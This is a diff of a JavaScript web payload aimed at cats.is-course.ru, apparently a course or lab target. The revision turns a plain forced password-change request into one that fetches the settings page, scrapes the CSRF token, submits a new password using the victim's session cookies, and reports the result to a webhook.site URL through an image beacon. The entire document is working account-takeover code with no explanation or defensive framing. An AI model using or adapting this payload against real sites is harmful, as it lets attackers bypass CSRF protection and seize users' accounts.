@@ -1,20 +1,29 @@
 <script>
+console.log('v2')
 fetch('https://cats.is-course.ru/settings', {
-    method: 'POST',
-    credentials: 'include',
-    headers: {
-        'Content-Type': 'application/x-www-form-urlencoded'
-    },
-    body: 'password=Abcdef_1234567&confirm-password=Abcdef_1234567'
+    credentials: 'include'
 })
-.then(response => {
-    // Проверяем результат
-    if(response.ok) {
-        // Пароль изменен - теперь логинимся
-        window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?password_changed=true";
-    }
+.then(r => r.text())
+.then(html => {
+    var tokenMatch = html.match(/name="csrf_token" value="([^"]+)"/);
+    var csrfToken = tokenMatch ? tokenMatch[1] : '';
+    
+    var formData = new URLSearchParams();
+    formData.append('password', 'Abcdef_1234567');
+    formData.append('confirm-password', 'Abcdef_1234567');
+    if(csrfToken) formData.append('csrf_token', csrfToken);
+    
+    return fetch('https://cats.is-course.ru/settings', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: formData
+    });
 })
-.catch(error => {
-    window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?error=" + error;
+.then(r => {
+    var img = new Image();
+    img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?status=" + r.status;
 });
 </script>
